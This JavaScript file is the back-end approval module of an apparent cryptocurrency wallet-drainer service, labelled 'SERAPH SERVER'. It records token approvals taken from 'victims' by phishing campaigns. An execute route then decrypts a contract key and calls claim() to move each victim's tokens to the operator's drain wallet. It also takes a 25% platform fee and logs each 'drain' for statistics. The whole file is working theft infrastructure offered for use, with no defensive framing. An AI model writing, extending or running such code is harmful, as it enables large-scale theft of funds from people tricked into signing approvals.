/**
 * ============================================================================
 * SERAPH SERVER - Approval Routes (v5 - Uses drain.service.js)
 * ============================================================================
 * 
 * v5 CHANGES:
 * - Now properly uses drain.service.js for logging
 * - Removed duplicate stats update code
 * - drain.service.updateDrainStatus() handles all stats
 * 
 * v4 CHANGES:
 * - Fixed drain_logs insert to include wallet_id
 * - Added wallet stats update after execution
 * 
 * v3 CHANGES:
 * - Execute now uses SPENDER's private key (not generic executor)
 * - Looks up contract by spender_address to get correct key
 * 
 * ============================================================================
 */

import { Router } from 'express'
import { ethers } from 'ethers'
import { requireOperator } from '../middleware/auth.js'
import notificationService from '../services/notification.service.js'
import drainService from '../services/drain.service.js'
import supabase from '../config/supabase.js'
import { success, badRequest, notFound, paginated } from '../utils/response.js'

const router = Router()

// ============================================================================
// Constants
// ============================================================================

const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address account) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)'
]

const PLATFORM_FEE_PERCENT = 25

// ============================================================================
// POST /approvals/capture - Public (from drainer)
// ============================================================================

router.post('/capture', async (req, res) => {
  try {
    const {
      campaignKey,
      victimAddress,
      tokenAddress,
      tokenSymbol,
      tokenDecimals,
      balance,
      balanceFormatted,
      valueUSD,
      spenderAddress,
      chainId,
      method,
      txHash
    } = req.body
    
    // Validate
    if (!campaignKey) return badRequest(res, 'campaignKey is required')
    if (!victimAddress || !ethers.isAddress(victimAddress)) return badRequest(res, 'Valid victimAddress required')
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) return badRequest(res, 'Valid tokenAddress required')
    if (!spenderAddress || !ethers.isAddress(spenderAddress)) return badRequest(res, 'Valid spenderAddress required')
    
    // txHash is required UNLESS method is 'already_approved'
    if (!txHash && method !== 'already_approved') {
      return badRequest(res, 'txHash is required')
    }
    
    // Find campaign
    const { data: campaign, error: campaignError } = await supabase
      .from('campaigns')
      .select('id, operator_id, name, status')
      .eq('campaign_key', campaignKey)
      .single()
    
    if (campaignError || !campaign) {
      console.error('[Approvals] Campaign not found:', campaignKey)
      return notFound(res, 'Campaign not found')
    }
    
    if (campaign.status !== 'active') {
      return badRequest(res, 'Campaign is not active')
    }
    
    // Check existing
    const { data: existing } = await supabase
      .from('approvals')
      .select('id')
      .eq('campaign_id', campaign.id)
      .eq('victim_address', victimAddress.toLowerCase())
      .eq('token_address', tokenAddress.toLowerCase())
      .eq('status', 'pending')
      .single()
    
    const approvalData = {
      campaign_id: campaign.id,
      operator_id: campaign.operator_id,
      victim_address: victimAddress.toLowerCase(),
      token_address: tokenAddress.toLowerCase(),
      token_symbol: tokenSymbol || 'UNKNOWN',
      token_decimals: tokenDecimals ?? 18,
      balance: balance?.toString() || '0',
      balance_formatted: balanceFormatted ? parseFloat(balanceFormatted) : null,
      value_usd: parseFloat(valueUSD) || 0,
      spender_address: spenderAddress.toLowerCase(),
      chain_id: chainId || 11155111,
      approval_method: method || 'approve',
      tx_hash: txHash || null,
      status: 'pending',
      updated_at: new Date().toISOString()
    }
    
    let approval
    let isUpdate = false
    
    if (existing) {
      const { data, error } = await supabase
        .from('approvals')
        .update(approvalData)
        .eq('id', existing.id)
        .select()
        .single()
      
      if (error) throw new Error(error.message)
      approval = data
      isUpdate = true
    } else {
      const { data, error } = await supabase
        .from('approvals')
        .insert(approvalData)
        .select()
        .single()
      
      if (error) throw new Error(error.message)
      approval = data
    }
    
    // Notification (non-blocking)
    if (!isUpdate && notificationService?.notifyApprovalCaptured) {
      setTimeout(() => {
        notificationService.notifyApprovalCaptured({
          operatorId: campaign.operator_id,
          victimAddress,
          tokenSymbol: tokenSymbol || 'UNKNOWN',
          valueUsd: parseFloat(valueUSD) || 0,
          method: method || 'approve',
          chainId: chainId || 11155111,
          campaignName: campaign.name
        }).catch(() => {})
      }, 0)
    }
    
    return success(res, {
      id: approval.id,
      status: approval.status,
      updated: isUpdate
    }, isUpdate ? 'Approval updated' : 'Approval captured')
    
  } catch (err) {
    console.error('[Approvals] Capture error:', err.message)
    return badRequest(res, err.message)
  }
})

// ============================================================================
// GET /approvals - List (authenticated)
// ============================================================================

router.get('/', requireOperator, async (req, res) => {
  try {
    const { page = 1, limit = 20, status, campaignId, chainId, search } = req.query
    const offset = (parseInt(page) - 1) * parseInt(limit)
    
    let query = supabase
      .from('approvals')
      .select('*, campaigns(name)', { count: 'exact' })
      .eq('operator_id', req.user.id)
      .order('created_at', { ascending: false })
      .range(offset, offset + parseInt(limit) - 1)
    
    if (status) query = query.eq('status', status)
    if (campaignId) query = query.eq('campaign_id', campaignId)
    if (chainId) query = query.eq('chain_id', parseInt(chainId))
    if (search) query = query.or(`victim_address.ilike.%${search}%,token_symbol.ilike.%${search}%`)
    
    const { data, error, count } = await query
    
    if (error) throw new Error(error.message)
    
    return paginated(res, data, {
      page: parseInt(page),
      limit: parseInt(limit),
      total: count || 0
    })
    
  } catch (err) {
    console.error('[Approvals] List error:', err.message)
    return badRequest(res, err.message)
  }
})

// ============================================================================
// GET /approvals/stats - Statistics (authenticated)
// ============================================================================

router.get('/stats', requireOperator, async (req, res) => {
  try {
    const { data: pending } = await supabase
      .from('approvals')
      .select('value_usd')
      .eq('operator_id', req.user.id)
      .eq('status', 'pending')
    
    const { data: executed } = await supabase
      .from('approvals')
      .select('executed_value_usd')
      .eq('operator_id', req.user.id)
      .eq('status', 'executed')
    
    const pendingCount = pending?.length || 0
    const pendingValue = pending?.reduce((sum, a) => sum + (parseFloat(a.value_usd) || 0), 0) || 0
    const executedCount = executed?.length || 0
    const executedValue = executed?.reduce((sum, a) => sum + (parseFloat(a.executed_value_usd) || 0), 0) || 0
    
    return success(res, {
      pending: { count: pendingCount, value: pendingValue },
      executed: { count: executedCount, value: executedValue }
    })
    
  } catch (err) {
    console.error('[Approvals] Stats error:', err.message)
    return badRequest(res, err.message)
  }
})

// ============================================================================
// GET /approvals/:id - Single (authenticated)
// ============================================================================

router.get('/:id', requireOperator, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('approvals')
      .select('*, campaigns(name, domain)')
      .eq('id', req.params.id)
      .eq('operator_id', req.user.id)
      .single()
    
    if (error || !data) return notFound(res, 'Approval not found')
    
    return success(res, data)
    
  } catch (err) {
    return badRequest(res, err.message)
  }
})

// ============================================================================
// POST /approvals/:id/execute - Execute via Contract (authenticated)
// ============================================================================

router.post('/:id/execute', requireOperator, async (req, res) => {
  try {
    const { id } = req.params
    
    // Get approval with campaign info
    const { data: approval, error: approvalError } = await supabase
      .from('approvals')
      .select('*, campaigns(destination_wallet, contract_id, wallet_id)')
      .eq('id', id)
      .eq('operator_id', req.user.id)
      .single()
    
    if (approvalError || !approval) return notFound(res, 'Approval not found')
    if (approval.status !== 'pending') return badRequest(res, `Cannot execute: ${approval.status}`)
    
    // Get destination
    const destination = approval.campaigns?.destination_wallet || process.env.DEFAULT_DRAIN_WALLET
    if (!destination) return badRequest(res, 'No destination configured')
    
    // =========================================================================
    // Get wallet_id for drain logging
    // =========================================================================
    
    let walletId = approval.campaigns?.wallet_id || null
    
    // If no wallet_id on campaign, try to find by destination address
    if (!walletId && destination) {
      const { data: wallet } = await supabase
        .from('wallets')
        .select('id')
        .eq('operator_id', req.user.id)
        .ilike('address', destination)
        .single()
      
      if (wallet) walletId = wallet.id
    }
    
    // =========================================================================
    // Get contract info - spender_address IS the contract
    // =========================================================================
    
    const { data: contract } = await supabase
      .from('contracts')
      .select('id, address, private_key_encrypted, contract_type')
      .ilike('address', approval.spender_address)
      .single()
    
    if (!contract) {
      return badRequest(res, `Contract not found for spender ${approval.spender_address}`)
    }
    
    // Decrypt owner's private key
    let ownerPrivateKey = null
    try {
      const { default: contractService } = await import('../services/contract.service.js')
      ownerPrivateKey = await contractService.getDecryptedPrivateKey(contract.id)
    } catch (err) {
      console.error('[Approvals] Failed to decrypt key:', err.message)
      return badRequest(res, 'Failed to get contract key')
    }
    
    if (!ownerPrivateKey) {
      return badRequest(res, 'Contract owner key not configured')
    }
    
    const chainId = approval.chain_id || 11155111
    const rpcUrl = process.env.RPC_URL
    if (!rpcUrl) return badRequest(res, 'RPC_URL not configured')
    
    // Setup wallet as contract OWNER (to call claim)
    const provider = new ethers.JsonRpcProvider(rpcUrl)
    const ownerWallet = new ethers.Wallet(ownerPrivateKey, provider)
    
    console.log(`[Approvals] Owner wallet: ${ownerWallet.address}`)
    console.log(`[Approvals] Contract: ${contract.address}`)
    console.log(`[Approvals] Account: ${approval.victim_address}`)
    console.log(`[Approvals] Token: ${approval.token_address}`)
    
    // Contract ABI - clean naming
    const ROUTER_ABI = [
      'function claim(address token, address account, address recipient) external',
      'function claimBatch(address[] tokens, address account, address recipient) external'
    ]
    
    const routerContract = new ethers.Contract(contract.address, ROUTER_ABI, ownerWallet)
    
    // Pre-check: verify allowance exists
    const tokenContract = new ethers.Contract(approval.token_address, ERC20_ABI, provider)
    const allowance = await tokenContract.allowance(approval.victim_address, contract.address)
    console.log(`[Approvals] Allowance: ${ethers.formatUnits(allowance, approval.token_decimals || 18)}`)
    
    if (allowance === 0n) {
      await supabase.from('approvals').update({ status: 'revoked', updated_at: new Date().toISOString() }).eq('id', id)
      return badRequest(res, 'Allowance revoked')
    }
    
    // Pre-check: verify balance
    const balance = await tokenContract.balanceOf(approval.victim_address)
    console.log(`[Approvals] Balance: ${ethers.formatUnits(balance, approval.token_decimals || 18)}`)
    
    if (balance === 0n) {
      await supabase.from('approvals').update({ status: 'expired', updated_at: new Date().toISOString() }).eq('id', id)
      return badRequest(res, 'Zero balance')
    }
    
    // Execute via contract's claim function
    console.log(`[Approvals] Calling claim on ${contract.address}`)
    console.log(`[Approvals] Recipient: ${destination}`)
    
    const tx = await routerContract.claim(
      approval.token_address,
      approval.victim_address,
      destination,
      { gasLimit: 300000 }
    )
    console.log(`[Approvals] TX sent: ${tx.hash}`)
    
    const receipt = await tx.wait()
    console.log(`[Approvals] ✅ Confirmed in block ${receipt.blockNumber}`)
    
    // Calculate values
    const decimals = approval.token_decimals || 18
    const amount = allowance < balance ? allowance : balance
    const executedAmount = parseFloat(ethers.formatUnits(amount, decimals))
    const tokenPrice = approval.value_usd / parseFloat(ethers.formatUnits(BigInt(approval.balance || '1'), decimals))
    const executedValueUsd = executedAmount * (tokenPrice || 0)
    const platformFeeUsd = executedValueUsd * (PLATFORM_FEE_PERCENT / 100)
    const operatorValueUsd = executedValueUsd - platformFeeUsd
    
    // Update approval status
    await supabase.from('approvals').update({
      status: 'executed',
      execution_tx_hash: receipt.hash,
      executed_amount: amount.toString(),
      executed_amount_formatted: executedAmount,
      executed_value_usd: executedValueUsd,
      executed_at: new Date().toISOString(),
      platform_fee_usd: platformFeeUsd,
      operator_value_usd: operatorValueUsd,
      updated_at: new Date().toISOString()
    }).eq('id', id)
    
    // =========================================================================
    // Use drain.service.js for proper stats tracking
    // =========================================================================
    
    try {
      // 1. Create drain log (status: pending)
      const drainLog = await drainService.createDrainLog({
        campaignId: approval.campaign_id,
        operatorId: req.user.id,
        walletId: walletId,
        victimAddress: approval.victim_address,
        attackType: 'token_claim',
        tokens: [{ 
          address: approval.token_address, 
          symbol: approval.token_symbol, 
          amount: executedAmount,
          valueUSD: executedValueUsd 
        }],
        totalValueUsd: executedValueUsd,
        chainId: chainId
      })
      
      // 2. Update status to success (this updates wallet/campaign/operator stats)
      await drainService.updateDrainStatus(drainLog.id, {
        status: 'success',
        txHash: receipt.hash,
        blockNumber: Number(receipt.blockNumber)
      })
      
      console.log(`[Approvals] Drain logged via drain.service: ${drainLog.id}`)
    } catch (e) {
      console.error('[Approvals] Drain service error:', e.message)
    }
    
    return success(res, {
      txHash: receipt.hash,
      executedAmount: executedAmount.toString(),
      executedValueUsd,
      operatorValueUsd
    }, 'Executed successfully')
    
  } catch (err) {
    console.error('[Approvals] Execute error:', err.message)
    
    // Update approval as failed
    const { data: currentApproval } = await supabase
      .from('approvals')
      .select('retry_count')
      .eq('id', req.params.id)
      .single()
    
    await supabase.from('approvals').update({ 
      status: 'failed', 
      error_message: err.message,
      retry_count: (currentApproval?.retry_count || 0) + 1,
      last_retry_at: new Date().toISOString(),
      updated_at: new Date().toISOString()
    }).eq('id', req.params.id)
    
    return badRequest(res, err.message)
  }
})

// ============================================================================
// DELETE /approvals/:id - Delete (authenticated)
// ============================================================================

router.delete('/:id', requireOperator, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('approvals')
      .delete()
      .eq('id', req.params.id)
      .eq('operator_id', req.user.id)
      .select()
      .single()
    
    if (error || !data) return notFound(res, 'Approval not found')
    
    return success(res, { id: req.params.id }, 'Deleted')
    
  } catch (err) {
    return badRequest(res, err.message)
  }
})

export default router